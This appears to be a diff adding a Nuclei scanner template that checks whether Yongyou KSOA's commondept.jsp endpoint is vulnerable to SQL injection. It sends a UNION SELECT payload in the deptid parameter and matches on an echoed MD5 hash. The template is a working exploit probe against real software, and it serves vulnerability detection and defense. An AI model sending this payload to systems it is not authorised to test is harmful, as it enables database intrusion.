@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-ksoa-common-deptjsp-sqli
+info:
+  name: Yongyou KSOA commondept.jsp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+
+variables:
+  num: "{{rand_int(10000, 99999)}}"
+  code: "{{md5(num)}}"
+
+http:
+  - raw:
+      - |
+        GET /common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60,sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{num}}'))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+        Accept: text/html
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{code}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
